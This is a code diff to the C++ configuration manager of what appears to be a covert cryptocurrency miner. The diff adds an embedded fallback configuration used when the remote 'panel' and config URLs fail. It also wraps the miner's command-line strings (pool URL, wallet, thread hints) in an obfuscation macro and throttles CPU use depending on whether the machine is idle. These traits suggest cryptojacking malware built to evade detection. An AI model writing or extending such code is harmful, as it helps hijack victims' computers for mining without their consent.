@@ -2,6 +2,9 @@
 #include "../include/http_client.h"
 #include "../include/util.h"
 #include "../include/encryption.h"
+#ifdef ENABLE_EMBEDDED_CONFIG
+#include "embedded_config_generated.h"
+#endif
 #include <iostream>
 #include <ctime>
 #include <sstream>
@@ -66,6 +69,12 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
     }
     
     std::cerr << "[-] All panel URLs failed" << std::endl;
+    
+    // Try embedded config as fallback
+    if (LoadEmbeddedConfig()) {
+        return true;
+    }
+    
     return false;
 }
 
@@ -118,6 +127,12 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
     }
     
     std::cerr << "[-] All config URLs failed" << std::endl;
+    
+    // Try embedded config as fallback
+    if (LoadEmbeddedConfig()) {
+        return true;
+    }
+    
     return false;
 }
 
@@ -267,14 +282,39 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
     }
 }
 
+bool ConfigManager::LoadEmbeddedConfig() {
+#ifdef ENABLE_EMBEDDED_CONFIG
+    // Load built-in fallback configuration from embedded generated JSON string
+    try {
+        // Use the generated JSON string constant
+        std::string configJson = EMBEDDED_CONFIG_JSON;
+        
+        // Parse JSON
+        json embeddedConfig = json::parse(configJson);
+        
+        // Use the same parsing logic
+        ParseConfigFromJson(embeddedConfig);
+        std::cout << "[*] Using embedded fallback configuration" << std::endl;
+        return true;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "[-] Error loading embedded config: " << e.what() << std::endl;
+        return false;
+    }
+#else
+    std::cerr << "[-] Embedded config not enabled at compile time" << std::endl;
+    return false;
+#endif
+}
+
 std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool isIdle) {
     if (config.mining_url.empty() || config.wallet.empty()) {
         return "";
     }
 
-    std::string args = ENCRYPT_STR("--donate-level 3 -o ");
+    std::string args = OBFUSCATE_STRING("--donate-level 3 -o ");
     args += config.mining_url + " ";
-    args += ENCRYPT_STR("-u ");
+    args += OBFUSCATE_STRING("-u ");
     args += config.wallet + " ";
     
     // Handle password: use Windows username if set to {USER}
@@ -284,24 +324,25 @@ std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool 
     }
     
     if (!password.empty()) {
-        args += ENCRYPT_STR("-p ");
+        args += OBFUSCATE_STRING("-p ");
         args += password + " ";
     }
     
     // Add TLS flag if use_ssl is enabled or if indicated in password field
     if (config.use_ssl == 1 || config.password.find("--tls") != std::string::npos) {
-        args += ENCRYPT_STR("--tls ");
+        args += OBFUSCATE_STRING("--tls ");
     }
     
     // Add performance settings based on idle state
+    // --cpu-max-threads-hint accepts percentage values (0-100+)
     double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
-    if (usagePercent > 0) {
+    if (usagePercent >= 0) {
         int hint = static_cast<int>(usagePercent);
-        args += ENCRYPT_STR("--cpu-max-threads-hint=");
+        args += OBFUSCATE_STRING("--cpu-max-threads-hint=");
         args += std::to_string(hint) + " ";
     }
     
-    args += ENCRYPT_STR("-a rx/0 --http-port 8888");
+    args += OBFUSCATE_STRING("-a rx/0 --http-port 8888");
     
     return args;
 }
